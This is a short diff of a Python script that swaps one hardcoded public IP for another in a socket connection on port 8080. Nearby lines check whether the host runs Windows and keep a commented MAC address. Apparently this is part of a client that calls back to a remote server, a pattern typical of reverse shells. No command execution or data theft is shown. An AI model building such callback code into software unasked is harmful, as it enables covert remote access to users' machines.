@@ -13,7 +13,7 @@ import binascii
 # Create a socket object (on local host)
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = 8080
-sock.connect(('13.250.125.188', port))
+sock.connect(('52.221.205.227', port))
 #00:0c:29:8e:fd:82
 
 on_windows = "windows" in platform.uname()[0].lower()
